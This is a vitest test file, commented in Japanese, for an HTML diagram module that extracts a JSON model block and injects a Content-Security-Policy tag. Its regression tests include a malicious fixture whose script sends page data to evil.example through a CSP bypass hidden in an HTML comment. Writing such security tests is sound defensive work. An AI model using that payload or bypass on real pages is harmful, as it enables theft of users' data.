import { describe, expect, it } from "vitest";
import {
  DIAGRAM_CSP,
  ensureDoctype,
  extractModel,
  injectCsp,
  replaceModelBlock,
} from "./diagram-file.js";
import type { DiagramModel } from "./diagram-model.js";

const MODEL = JSON.stringify({
  version: 1,
  title: "T",
  nodes: [{ id: "a", label: "A" }],
});

const MODEL_OBJ: DiagramModel = {
  version: 1,
  title: "T",
  nodes: [{ id: "a", label: "A" }],
  edges: [],
  groups: [],
};

function page(body: string, head = ""): string {
  return `<!doctype html><html><head>${head}</head><body>${body}</body></html>`;
}

describe("extractModel", () => {
  it("script[type=application/json] からモデルを取り出す", () => {
    const html = page(
      `<script type="application/json" id="ark-diagram-model">${MODEL}</script><div>図</div>`
    );

    const result = extractModel(html);

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.model.nodes[0]?.label).toBe("A");
  });

  it("モデルブロックが無ければ失敗する", () => {
    const result = extractModel(page("<div>図だけ</div>"));

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("ark-diagram-model");
  });

  it("属性の順序が逆でも取り出せる", () => {
    const html = page(
      `<script id="ark-diagram-model" type="application/json">${MODEL}</script>`
    );

    expect(extractModel(html).ok).toBe(true);
  });

  it("type=application/json が無いブロックは id が一致しても拒否する", () => {
    // type 無しの <script id="ark-diagram-model"> はサーバー検証を通っても
    // ブラウザには JS として実行されてしまう（skill / エラーメッセージが
    // type="application/json" を要求しているのに、実装が id だけで
    // 一致させていた契約違反）。
    const html = page(`<script id="ark-diagram-model">${MODEL}</script>`);

    const result = extractModel(html);

    expect(result.ok).toBe(false);
  });

  it("type が application/json 以外のブロックは id が一致しても拒否する", () => {
    const html = page(
      `<script id="ark-diagram-model" type="text/javascript">${MODEL}</script>`
    );

    const result = extractModel(html);

    expect(result.ok).toBe(false);
  });
});

describe("injectCsp", () => {
  it("head の直後に meta CSP を差し込む", () => {
    const out = injectCsp(page("<div>x</div>"));

    expect(out).toContain(DIAGRAM_CSP);
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<div>x</div>"));
  });

  it("head が無い文書でも先頭に差し込む", () => {
    const out = injectCsp("<div>x</div>");

    expect(out).toContain(DIAGRAM_CSP);
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<div>x</div>"));
  });

  it("生成物が自前で書いた CSP meta は取り除いてから差し込む", () => {
    const html = page(
      "<div>x</div>",
      `<meta http-equiv="Content-Security-Policy" content="default-src *">`
    );

    const out = injectCsp(html);

    expect(out).not.toContain("default-src *");
    expect(out.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
  });

  it("HTML コメント内の <head> を誤検出して CSP を挿入しない（脆弱性修正1）", () => {
    // コメント内に <head> があると、現在の実装はそこに CSP を挿入してしまう。
    // CSP meta がコメントの中に入って無効化され、コメント外のスクリプトが CSP なしで実行される。
    const malicious = `<!-- <head> -->
<script>fetch('https://evil.example/exfil?d=' + document.title)</script>
<html><head><meta charset="utf-8"></head><body>diagram</body></html>`;

    const out = injectCsp(malicious);

    // CSP は常に文書の先頭に置かれ、コメント外に出ているべき
    expect(out.startsWith(DIAGRAM_CSP)).toBe(true);
  });

  it("引用符なし属性値の既存 CSP を除去する（脆弱性修正2）", () => {
    const html = page(
      "<div>x</div>",
      `<meta http-equiv=Content-Security-Policy content="default-src *">`
    );

    const out = injectCsp(html);

    // 引用符なし CSP が除去されているべき
    expect(out).not.toContain("default-src *");
    // Ark の CSP だけが残るべき
    expect(out.match(/http-equiv=.*Content-Security-Policy/g)).toHaveLength(1);
  });
});

describe("replaceModelBlock", () => {
  it("モデルブロックが新しい内容に差し替わる", () => {
    const html = page(
      `<script type="application/json" id="ark-diagram-model">${MODEL}</script><div>図</div>`
    );
    const nextModel: DiagramModel = {
      ...MODEL_OBJ,
      nodes: [{ id: "a", label: "A2" }],
    };

    const result = replaceModelBlock(html, nextModel);

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.html).toContain('"label": "A2"');
      expect(result.html).not.toContain('"label": "A"');
    }
  });

  it("投影（DOM）部分は変わらない", () => {
    const html = page(
      `<script type="application/json" id="ark-diagram-model">${MODEL}</script><div class="entity" data-model-id="a">A</div>`
    );
    const nextModel: DiagramModel = {
      ...MODEL_OBJ,
      nodes: [{ id: "a", label: "A2" }],
    };

    const result = replaceModelBlock(html, nextModel);

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.html).toContain(
        '<div class="entity" data-model-id="a">A</div>'
      );
    }
  });

  it("モデルブロックが無ければエラーを返す", () => {
    const result = replaceModelBlock(page("<div>図だけ</div>"), MODEL_OBJ);

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("ark-diagram-model");
  });

  it("差し替え後の HTML を extractModel で読むと新モデルが取れる（往復）", () => {
    const html = page(
      `<script type="application/json" id="ark-diagram-model">${MODEL}</script><div>図</div>`
    );
    const nextModel: DiagramModel = {
      ...MODEL_OBJ,
      nodes: [{ id: "a", label: "A2" }],
    };

    const replaced = replaceModelBlock(html, nextModel);
    expect(replaced.ok).toBe(true);
    if (!replaced.ok) return;

    const extracted = extractModel(replaced.html);
    expect(extracted.ok).toBe(true);
    if (extracted.ok) expect(extracted.model.nodes[0]?.label).toBe("A2");
  });

  it("属性の順序が逆でも差し替えられる", () => {
    const html = page(
      `<script id="ark-diagram-model" type="application/json">${MODEL}</script>`
    );

    const result = replaceModelBlock(html, {
      ...MODEL_OBJ,
      nodes: [{ id: "a", label: "A2" }],
    });

    expect(result.ok).toBe(true);
  });

  it("type=application/json が無いブロックは差し替え対象にしない", () => {
    const html = page(`<script id="ark-diagram-model">${MODEL}</script>`);

    const result = replaceModelBlock(html, MODEL_OBJ);

    expect(result.ok).toBe(false);
  });
});

describe("ensureDoctype", () => {
  it("doctype が無い HTML の先頭に補う", () => {
    const out = ensureDoctype("<html><body>x</body></html>");

    expect(out).toBe("<!doctype html>\n<html><body>x</body></html>");
  });

  it("既に doctype があれば変えない（大文字小文字を問わない）", () => {
    const lower = "<!doctype html>\n<html></html>";
    const upper = "<!DOCTYPE html>\n<html></html>";

    expect(ensureDoctype(lower)).toBe(lower);
    expect(ensureDoctype(upper)).toBe(upper);
  });

  it("先頭の空白や BOM を挟んでいても二重に付けない", () => {
    const padded = "﻿  \n<!doctype html><html></html>";

    expect(ensureDoctype(padded)).toBe(padded);
  });
});

describe("injectCsp と doctype の順序", () => {
  it("doctype があればその直後に CSP を差し込む（doctype より前に置かない）", () => {
    const out = injectCsp("<!doctype html>\n<html><body>x</body></html>");

    expect(out.indexOf("<!doctype")).toBe(0);
    expect(out.indexOf(DIAGRAM_CSP)).toBeGreaterThan(out.indexOf("<!doctype"));
    expect(out.indexOf(DIAGRAM_CSP)).toBeLessThan(out.indexOf("<body>"));
  });

  it("コメント内の偽 doctype では位置をずらせない（先頭アンカーのみ一致）", () => {
    const html = "<!-- <!doctype html> --><script>bad()</script>";

    const out = injectCsp(html);

    // 偽 doctype は先頭アンカーに一致しない（コメント開始が先頭）ため、
    // CSP は文書先頭に置かれ、script より必ず前に来る
    expect(out.indexOf(DIAGRAM_CSP)).toBe(0);
  });
});
